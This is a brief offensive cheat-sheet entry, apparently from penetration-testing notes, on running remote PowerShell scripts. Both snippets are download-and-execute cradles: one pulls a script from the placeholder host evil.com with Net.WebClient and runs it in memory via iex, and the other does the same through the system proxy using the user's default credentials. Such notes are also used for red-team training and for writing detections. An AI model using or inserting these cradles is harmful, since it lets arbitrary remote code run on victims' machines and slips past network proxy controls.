# PowerShell

## Execute External Scripts

Using `DownloadString` and `Invoke-WebRequest (iex)`, we can execute external PowerShell scripts.

```powershell
iex((New-Object Net.WebClient).DownloadString("https://evil.com/evil.ps1"))
```

Additionally, it is possible to run it through a proxy.

```powershell
$p = [System.Net.WebRequest]::GetSystemWebProxy()
$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials
$w=New-Object net.webclient;$w.proxy=$p
$w.UseDefaultCredentials=$true
iex $($w.DownloadString("https://evil.com/evil.ps1"))
```
